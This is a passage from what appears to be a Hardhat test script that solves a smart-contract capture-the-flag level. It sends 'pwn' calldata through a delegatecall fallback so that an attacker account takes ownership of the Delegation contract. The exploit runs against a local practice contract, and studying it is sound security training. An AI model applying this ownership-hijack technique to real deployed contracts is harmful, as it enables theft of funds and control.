let deployer, attacker, delegation
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        await deployments.fixture(["06"])
        delegate = await ethers.getContract("Delegate")
        delegation = await ethers.getContract("Delegation")
    })
    it("should transfer ownership to the attacker", async function () {
        
        const initialOwner = await delegation.owner()
        assert.equal(initialOwner, deployer.address)

        
        const calldata = delegate.interface.encodeFunctionData("pwn", [])

        
        await attacker.sendTransaction({
            to: delegation.address,
            data: calldata,
        })

        
        const newOwner = await delegation.owner()
        assert.equal(newOwner, attacker.address)
    })

